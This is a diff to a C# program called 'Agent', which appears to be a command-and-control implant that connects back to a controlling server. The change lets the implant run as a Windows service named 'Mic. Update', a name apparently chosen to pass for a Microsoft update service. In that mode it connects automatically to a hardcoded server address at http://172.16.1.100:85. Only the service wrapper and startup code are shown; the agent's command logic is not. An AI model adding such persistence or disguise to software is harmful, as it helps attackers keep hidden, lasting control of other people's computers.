@@ -10,13 +10,58 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
+#if SERVICE
+using System.ServiceProcess;
+#endif
+
 namespace Agent
 {
     class Program
     {
+#if SERVICE
+        #region Nested classes to support running as service
+        public const string ServiceName = "Mic. Update";
+
+        public class Service : ServiceBase
+        {
+            public Service()
+            {
+                ServiceName = Program.ServiceName;
+            }
+
+            protected override void OnStart(string[] args)
+            {
+                args = new string[] { "http://172.16.1.100:85" };
+                Program.Start(args);
+            }
+
+            protected override void OnStop()
+            {
+                Program.Stop();
+            }
+        }
+        #endregion
+#endif
 
         static void Main(string[] args)
         {
+#if SERVICE
+            // running as service
+            using (var service = new Service())
+                ServiceBase.Run(service);
+#else
+            // running as console app
+            Start(args);
+#endif
+
+        }
+
+
+        static Thread s_agentThread = null;
+
+        private static void Start(string[] args)
+        {
+
 
 #if DEBUG
             Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));
@@ -28,6 +73,10 @@ namespace Agent
             //args = new string[] { "pipe://192.168.56.103:aaaaaaaaaa" };
             //args = new string[] { "tcps://127.0.0.1:4545" };
             //args = new string[] { "pipes://127.0.0.1:foo" };
+#endif
+
+#if SERVICE
+
 #endif
             if (args.Count() == 0)
             {
@@ -60,9 +109,15 @@ namespace Agent
             var commModule = CommunicationFactory.CreateCommunicator(connexion);
             var agent = new Models.Agent(metaData, commModule);
 
-            Thread agentThread = new Thread(agent.Start);
-            agentThread.Start();
-            agentThread.Join();
+            s_agentThread = new Thread(agent.Start);
+            s_agentThread.Start();
+            s_agentThread.Join();
+        }
+
+        private static void Stop()
+        {
+            // onstop code here
+            s_agentThread.Abort();
         }
 
 
